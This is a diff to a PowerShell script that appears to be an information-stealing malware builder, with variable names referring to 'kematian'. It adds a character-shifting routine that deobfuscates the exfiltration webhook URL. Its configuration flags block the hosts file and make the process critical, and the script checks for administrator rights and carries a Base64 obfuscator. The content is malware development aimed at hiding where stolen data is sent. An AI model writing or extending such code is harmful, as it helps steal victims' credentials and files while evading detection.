@@ -1,4 +1,23 @@
+function Deobfuscate-String {
+    param(
+        [string]$ObfuscatedString
+    )
+    
+    $DeobfuscatedString = ""
+    
+    foreach ($char in $ObfuscatedString.ToCharArray()) {
+        $asciiValue = [int][char]$char
+        $deobfuscatedChar = [char]($asciiValue - 2000)
+        $DeobfuscatedString += $deobfuscatedChar
+    }
+    
+    return $DeobfuscatedString
+}
+
 $webhook = "YOUR_WEBHOOK_HERE" 
+if ($webhook -notlike '*https://*') {
+    $webhook = Deobfuscate-String "YOUR_WEBHOOK_HERE"
+}
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
@@ -69,6 +88,8 @@ function CHECK_AND_PATCH {
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
+
+
 
 function Base64-Obfuscator {
     # Author: Mr.Un1k0d3r RingZer0 Team
